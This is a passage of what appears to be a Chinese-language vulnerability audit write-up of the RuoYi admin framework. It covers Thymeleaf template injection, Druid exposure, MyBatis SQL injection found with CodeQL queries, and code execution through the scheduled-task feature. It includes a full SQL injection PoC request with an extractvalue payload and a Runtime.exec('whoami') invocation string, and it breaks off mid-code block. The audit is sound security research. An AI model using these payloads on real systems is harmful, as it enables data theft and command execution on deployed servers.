+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">shiroFilterFactoryBean</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里对除静态资源可以通过匿名访问, 其他任何路径都需要认证才能访问, 这就导致了不存在权限绕过漏洞</p>
+<h2 id="thymeleaf">Thymeleaf</h2>
+<p>因为看到Thymeleaf依赖版本是在漏洞版本, 原理可以看之前的文章</p>
+<p>因为若依这个项目的都采用的是<code>@Controller</code>​注解, 现在就是要去找可用的<code>controller</code>​（即返回值可控的）</p>
+<p>我们关注两点：</p>
+<ol>
+<li>URL 路径可控</li>
+<li>return 内容可控</li>
+</ol>
+<p>编写codeql缩小范围</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">AllControllerMethod</span> <span class="k">extends</span> <span class="n">Callable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">AllControllerMethod</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">this</span><span class="o">.</span><span class="n">getReturnType</span><span class="p">()</span><span class="o">.</span><span class="n">toString</span><span class="p">()</span> <span class="o">=</span> <span class="s2">&#34;String&#34;</span> <span class="ow">and</span>
+</span></span><span class="line"><span class="cl">        <span class="n">this</span><span class="o">.</span><span class="n">getDeclaringType</span><span class="p">()</span><span class="o">.</span><span class="n">getASupertype</span><span class="o">*</span><span class="p">()</span><span class="o">.</span><span class="n">getQualifiedName</span><span class="p">()</span><span class="o">.</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;%Controller&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">AllControllerMethod</span> <span class="n">acm</span>
+</span></span><span class="line"><span class="cl"><span class="n">select</span> <span class="n">acm</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262202154.png" alt="image"></p>
+<p>可以发现<code>/monitor/cache/getNames</code>​可以post一个<code>fragment</code>​, 从而触发SSTI</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262202837.png" alt="image"></p>
+<p>但还是需要登录</p>
+<p>当然这里还是无回显的, 可以打内存马, 但是通过模版注入打内存马暂时没看, 也不想看, 遇到实际场景或者需要的时候再学即可</p>
+<h2 id="druid泄漏">druid泄漏</h2>
+<p>挂xray就可以检测出来</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262202550.png" alt="image"></p>
+<p>正常的来说, 这个页面是需要登陆的, 而在我们登陆若依后, 访问的时候就直接访问到了, 对于swaggerui也是</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262202609.png" alt="image"></p>
+<h2 id="sql注入">SQL注入</h2>
+<p>若依采用的是<code>mybatis</code>​方式去与数据库交互的, 可以先看下ruoyi怎么配置mybatis的</p>
+<p>ruoyi中关于mybatis的相关配置在<code>application.yml</code>​文件中：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="c"># MyBatis</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">mybatis</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># 搜索指定包别名</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">typeAliasesPackage</span><span class="p">:</span><span class="w"> </span><span class="l">com.ruoyi.**.domain</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># 配置mapper的扫描，找到所有的mapper.xml映射文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">mapperLocations</span><span class="p">:</span><span class="w"> </span><span class="l">classpath*:mapper/**/*Mapper.xml</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># 加载全局的配置文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">configLocation</span><span class="p">:</span><span class="w"> </span><span class="l">classpath:mybatis/mybatis-config.xml</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以全部的sql语句都在<code>mapper/**/*Mapper.xml</code>​下</p>
+<p>简单粗暴的方法，遍历所有<em>​<code>classpath</code>​</em>​<code>:mapper/**/*Mapper.xml</code>​文件, 因为它的配置文件都是在<code>resources</code>​目录下, 就可以直接搜索<code>${}</code>​, 只看<code>resources</code>​目录下的, 这样就减少了大量的log、字符串常量、XML描述符的部分</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262202738.png" alt="image"></p>
+<p>例如:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">	<span class="nt">&lt;update</span> <span class="na">id=</span><span class="s">&#34;updateDeptStatus&#34;</span> <span class="na">parameterType=</span><span class="s">&#34;SysDept&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl"> 	    update sys_dept
+</span></span><span class="line"><span class="cl"> 	    <span class="nt">&lt;set&gt;</span>
+</span></span><span class="line"><span class="cl"> 	        <span class="nt">&lt;if</span> <span class="na">test=</span><span class="s">&#34;status != null and status != &#39;&#39;&#34;</span><span class="nt">&gt;</span>status = #{status},<span class="nt">&lt;/if&gt;</span>
+</span></span><span class="line"><span class="cl"> 	        <span class="nt">&lt;if</span> <span class="na">test=</span><span class="s">&#34;updateBy != null and updateBy != &#39;&#39;&#34;</span><span class="nt">&gt;</span>update_by = #{updateBy},<span class="nt">&lt;/if&gt;</span>
+</span></span><span class="line"><span class="cl"> 	        update_time = sysdate()
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/set&gt;</span>
+</span></span><span class="line"><span class="cl"> 	    where dept_id in (${ancestors})
+</span></span><span class="line"><span class="cl">	<span class="nt">&lt;/update&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其实找到这里之后, ruoyi的sql注入就很ez了, 只需要往前找调用处即可找到Controller</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Log</span><span class="p">(</span><span class="n">title</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;部门管理&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">businessType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BusinessType</span><span class="p">.</span><span class="na">UPDATE</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@RequiresPermissions</span><span class="p">(</span><span class="s">&#34;system:dept:edit&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&#34;/edit&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@ResponseBody</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">AjaxResult</span><span class="w"> </span><span class="nf">editSave</span><span class="p">(</span><span class="nd">@Validated</span><span class="w"> </span><span class="n">SysDept</span><span class="w"> </span><span class="n">dept</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">UserConstants</span><span class="p">.</span><span class="na">DEPT_NAME_NOT_UNIQUE</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">deptService</span><span class="p">.</span><span class="na">checkDeptNameUnique</span><span class="p">(</span><span class="n">dept</span><span class="p">)))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">error</span><span class="p">(</span><span class="s">&#34;修改部门&#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">dept</span><span class="p">.</span><span class="na">getDeptName</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&#39;失败，部门名称已存在&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">dept</span><span class="p">.</span><span class="na">getParentId</span><span class="p">().</span><span class="na">equals</span><span class="p">(</span><span class="n">dept</span><span class="p">.</span><span class="na">getDeptId</span><span class="p">()))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">error</span><span class="p">(</span><span class="s">&#34;修改部门&#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">dept</span><span class="p">.</span><span class="na">getDeptName</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&#39;失败，上级部门不能是自己&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">StringUtils</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">UserConstants</span><span class="p">.</span><span class="na">DEPT_DISABLE</span><span class="p">,</span><span class="w"> </span><span class="n">dept</span><span class="p">.</span><span class="na">getStatus</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">deptService</span><span class="p">.</span><span class="na">selectNormalChildrenDeptById</span><span class="p">(</span><span class="n">dept</span><span class="p">.</span><span class="na">getDeptId</span><span class="p">())</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">AjaxResult</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="s">&#34;该部门包含未停用的子部门！&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">dept</span><span class="p">.</span><span class="na">setUpdateBy</span><span class="p">(</span><span class="n">ShiroUtils</span><span class="p">.</span><span class="na">getLoginName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">toAjax</span><span class="p">(</span><span class="n">deptService</span><span class="p">.</span><span class="na">updateDept</span><span class="p">(</span><span class="n">dept</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="poc">poc</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">dept</span><span class="o">/</span><span class="n">edit</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">1</span><span class="p">.</span><span class="na">148</span><span class="p">:</span><span class="n">8888</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="p">:</span><span class="w"> </span><span class="n">max</span><span class="o">-</span><span class="n">age</span><span class="o">=</span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span><span class="w"> </span><span class="n">Intel</span><span class="w"> </span><span class="n">Mac</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">X</span><span class="w"> </span><span class="n">10_15_7</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">135</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">apng</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">signed</span><span class="o">-</span><span class="n">exchange</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="n">b3</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">7</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//192.168.1.148:8888/login</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">JSESSIONID</span><span class="o">=</span><span class="n">5753231a</span><span class="o">-</span><span class="n">95d6</span><span class="o">-</span><span class="n">4c1b</span><span class="o">-</span><span class="n">a8e5</span><span class="o">-</span><span class="n">79dec426774f</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">deptName</span><span class="o">=</span><span class="n">1</span><span class="o">&amp;</span><span class="n">DeptId</span><span class="o">=</span><span class="n">100</span><span class="o">&amp;</span><span class="n">ParentId</span><span class="o">=</span><span class="n">12</span><span class="o">&amp;</span><span class="n">Status</span><span class="o">=</span><span class="n">0</span><span class="o">&amp;</span><span class="n">OrderNum</span><span class="o">=</span><span class="n">1</span><span class="o">&amp;</span><span class="n">ancestors</span><span class="o">=</span><span class="n">0</span><span class="p">)</span><span class="n">or</span><span class="p">(</span><span class="n">extractvalue</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="n">concat</span><span class="p">((</span><span class="n">select</span><span class="w"> </span><span class="nf">user</span><span class="p">()))));</span><span class="err">#</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>其他应该都可以利用的</p>
+<h3 id="codeql">codeql</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * @kind path-problem
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">class</span> <span class="nc">SqlMethod</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">Callable</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">SqlMethod</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">getName</span><span class="p">()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;selectDeptList&#34;</span><span class="w"> </span><span class="n">or</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">getName</span><span class="p">()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;updateDeptStatus&#34;</span><span class="w"> </span><span class="n">or</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">getName</span><span class="p">()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;selectRoleList&#34;</span><span class="w"> </span><span class="n">or</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">getName</span><span class="p">()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;selectUserList&#34;</span><span class="w"> </span><span class="n">or</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">getName</span><span class="p">()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;selectAllocatedList&#34;</span><span class="w"> </span><span class="n">or</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">getName</span><span class="p">()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;selectUnallocatedList&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">class</span> <span class="nc">AllControllerMethod</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">Callable</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">AllControllerMethod</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">getDeclaringType</span><span class="p">().</span><span class="na">getASupertype</span><span class="o">*</span><span class="p">().</span><span class="na">getQualifiedName</span><span class="p">().</span><span class="na">matches</span><span class="p">(</span><span class="s">&#34;%Controller&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// 定义一个调用图的边关系, 表示 a 可以调用 b</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// 考虑了多态（polyCalls）的情况, 也就是说不仅考虑直接调用, 还考虑重载或实现关系的调用。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">query</span><span class="w"> </span><span class="n">predicate</span><span class="w"> </span><span class="nf">edges</span><span class="p">(</span><span class="n">Callable</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="n">Callable</span><span class="w"> </span><span class="n">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="na">polyCalls</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">from</span><span class="w"> </span><span class="n">AllControllerMethod</span><span class="w"> </span><span class="n">source</span><span class="p">,</span><span class="w"> </span><span class="n">SqlMethod</span><span class="w"> </span><span class="n">sink</span><span class="p">,</span><span class="w"> </span><span class="n">Callable</span><span class="w"> </span><span class="n">c</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// 使用+, 表示在 edges 定义的调用图上做传递闭包</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// 即从 source（Controller 方法）出发, 经由多个中间方法, 是否最终可以到达 c。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">where</span><span class="w"> </span><span class="n">edges</span><span class="o">+</span><span class="p">(</span><span class="n">source</span><span class="p">,</span><span class="w"> </span><span class="n">c</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">select</span><span class="w"> </span><span class="n">sink</span><span class="p">,</span><span class="w"> </span><span class="n">source</span><span class="p">,</span><span class="w"> </span><span class="n">sink</span><span class="p">.</span><span class="na">getACallee</span><span class="p">(),</span><span class="w"> </span><span class="s">&#34;sql&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262202371.png" alt="image"></p>
+<h2 id="snakeyaml">SnakeYaml</h2>
+<p>全局搜yaml</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262202034.png" alt="image"></p>
+<p>这里可以读取文件, 然后反序列化, 但是该方法并没有被调用</p>
+<p>但是项目中有一个定时任务的功能</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262203031.png" alt="image"></p>
+<p>执行一次之后可以看见后端出现“执行无参方法”, 全局搜索</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262203681.png" alt="image"></p>
+<p>可以发现正是定时任务中写的<code>ryTask.ryNoParams</code>​, 那么这里就可以通过Bean调用或者Class调用来执行指定类及其方法</p>
+<p>来一发<code>java.lang.Runtime.getRuntime().exec(&quot;whoami&quot;)</code>​</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262203021.png" alt="image"></p>
+<p>看到private相关的错误, 找到<code>JobInvokeUtil#invokeMethod</code>​</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262203588.png" alt="image"></p>
+<p>判断全限定类名是否合法, 合法就通过Bean调用, 否则利用Class反射调用, 但是这里没有获取<code>Constructor</code>​并设置<code>setAccessible(true)</code>​, 所以目标类具有非public的无参构造函数来实例化</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
